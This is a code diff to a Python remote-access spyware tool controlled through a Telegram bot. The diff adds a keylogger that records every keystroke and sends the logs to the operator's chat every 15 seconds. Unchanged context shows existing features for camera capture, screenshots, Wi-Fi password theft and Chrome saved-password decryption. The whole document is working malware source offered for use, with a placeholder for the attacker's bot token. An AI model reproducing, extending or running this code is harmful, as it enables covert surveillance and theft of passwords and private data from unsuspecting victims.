@@ -1,6 +1,6 @@
 import os
 try:
-    import telebot,json,base64,sqlite3,shutil,win32crypt,pyautogui,subprocess,geocoder,time
+    import telebot,json,base64,sqlite3,shutil,win32crypt,pyautogui,subprocess,geocoder,time,threading
     from telebot import types
     from Crypto.Cipher import AES
     from datetime import timezone, datetime, timedelta
@@ -9,6 +9,33 @@ except:
 
 bot_token = "ENTER_YOUR_BOT_TOKEN_HERE"
 bot = telebot.TeleBot(token=bot_token,parse_mode=None)
+
+#KEYLOGGER
+keylogs_data = ''
+WANT = 'no'
+
+def autolog():
+    global keylogs_data
+    from pynput.keyboard import Listener
+    def on_press(key):
+        global keylogs_data
+        keylogs_data = keylogs_data+str(key)
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+def log_sender(CHAT_ID):
+    global keylogs_data,WANT
+    while 1==1:
+        time.sleep(15)
+        if len(keylogs_data) == 0:
+            pass
+        else:
+            if WANT=='yes':
+                keylogs_data_final = keylogs_data
+                keylogs_data = ''
+                bot.send_message(CHAT_ID, keylogs_data_final.replace('Key.backspace','\b').replace("Key.ctrl_l'\x16'"," paste ").replace("Key.ctrl_l'\x03'"," copy ").replace("''","").replace('Key.space',' ').replace('Key.enter','\n').replace("'",""))
+            else:
+                pass
 
 #CAMERA
 def camera():
@@ -189,9 +216,10 @@ try:
     itembtn3 = types.KeyboardButton('Ducky')
     itembtn4 = types.KeyboardButton('Record')
     itembtn5 = types.KeyboardButton('wifipass')
-    itembtn6 = types.KeyboardButton('screenshot')
-    itembtn7 = types.KeyboardButton('chromepass')
-    markup.add(itembtn1,itembtn2,itembtn3,itembtn4,itembtn5,itembtn6,itembtn7)
+    itembtn6 = types.KeyboardButton('Keylogger')
+    itembtn7 = types.KeyboardButton('screenshot')
+    itembtn8 = types.KeyboardButton('chromepass')
+    markup.add(itembtn1,itembtn2,itembtn3,itembtn4,itembtn5,itembtn6,itembtn7,itembtn8)
     bot.send_message(message.from_user.id,message.text, reply_markup=markup)
 except:
     pass
@@ -216,10 +244,26 @@ def send_text(message):
     except:
         bot.send_message(message.from_user.id, 'Error!')
 
-
 try:
   @bot.message_handler(func=lambda message: True)
   def message_handel(message):
+
+    #KEYLOGGER
+    threading.Thread(target=log_sender,args=[message.from_user.id]).start()
+    global WANT
+    try:
+        if 'keylogger' in str(message.text).lower():
+            if str(message.text).lower() == 'keylogger':
+                bot.send_message(message.from_user.id, 'Type "keylogger start" to start')
+                bot.send_message(message.from_user.id, 'Type "keylogger stop" to stop')
+            if "keylogger start" in str(message.text).lower():
+                WANT = 'yes'
+                bot.send_message(message.from_user.id, 'Will send you the keylogs')
+            elif "keylogger stop" in str(message.text).lower():
+                WANT = 'no'
+                bot.send_message(message.from_user.id, 'Will not send you the keylogs')
+    except:
+        bot.send_message(message.from_user.id, 'Error!')
 
     #Ducky
     try:
@@ -316,5 +360,5 @@ try:
 except:
     pass
 
-
+threading.Thread(target=autolog).start()
 bot.polling()
